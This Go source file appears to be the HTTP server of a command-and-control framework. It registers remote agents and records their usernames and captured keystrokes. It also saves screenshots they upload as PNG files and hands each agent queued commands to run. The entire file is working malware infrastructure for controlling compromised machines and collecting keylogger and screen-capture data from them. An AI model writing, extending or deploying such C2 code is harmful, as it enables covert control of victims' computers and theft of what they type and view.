package c2

import (
	"bytes"
	"image"
	"image/png"
	"io"
	"net/http"
	"os"
	"strings"
	"time"

	"github.com/google/uuid"
	"github.com/hardal7/pex/internal/config"
	logger "github.com/hardal7/pex/internal/util"
)

func ServeHTTP() {
	root := http.NewServeMux()
	root.Handle("/", http.HandlerFunc(requestHandler()))

	server := http.Server{
		Addr:    ":" + config.BeaconPort,
		Handler: root,
	}
	logger.Info("Starting server on port: " + config.BeaconPort)
	err := server.ListenAndServe()
	if err != nil {
		logger.Error("Failed to start server: " + err.Error())
	}
}

func requestHandler() http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		if r.Header.Get("Register") == "true" {
			uuid, _ := uuid.NewRandom()
			w.Write([]byte(uuid.String()))
			mu.Lock()
			State.RegisteredAgents = append(State.RegisteredAgents, Agent{UUID: uuid.String(), Hostname: r.RemoteAddr, Username: r.Header.Get("Username")})
			mu.Unlock()
			logger.Info("Registered agent: " + r.RemoteAddr + " with UUID: " + uuid.String())
		} else if strings.TrimSpace(r.Header.Get("UUID")) == State.SelectedAgent.Alias || "ALL" == State.SelectedAgent.Alias {
			logger.Debug("Connected Agent:")
			logger.Debug("Address: " + r.RemoteAddr)
			logger.Debug("Username: " + r.Header.Get("Username"))
			if r.Header.Get("Keys") != "" {
				logger.Debug("Keys Pressed: " + r.Header.Get("Keys"))
			}
			response, err := io.ReadAll(r.Body)
			if err != nil {
				logger.Info("Failed reading request body: " + err.Error())
				return
			}

			if r.Header.Get("Content-Type") == "image/png" {
				logger.Info("Received response with image")
				image, _, _ := image.Decode(bytes.NewReader(response))
				out, err := os.Create("./" + r.RemoteAddr + ":" + time.Now().Format("2006-01-01 00:00:00") + ".png")
				if err != nil {
					logger.Info("Failed creating image file")
				}
				defer out.Close()
				png.Encode(out, image)
			} else if string(response) != "" {
				logger.Info("Received response:\n" + string(response))
			}

			requestCommand(w, r)
		} else {
			w.Write([]byte(""))
			logger.Debug("Pinged agent: " + r.RemoteAddr)
		}
	}
}

func requestCommand(w http.ResponseWriter, r *http.Request) {
	if len(State.Tasks) != 0 {
		logger.Warn("asdad")
		if State.Tasks[0].Command != "" && State.Tasks[0].Recipient.UUID == strings.TrimSpace(r.Header.Get("UUID")) {
			w.Write([]byte(State.Tasks[0].Command))
			logger.Info("Command requested: " + State.Tasks[0].Command)
			State.Tasks = State.Tasks[1:]
		}
	} else {
		w.Write([]byte(""))
		logger.Debug("Pinged agent")
	}
}
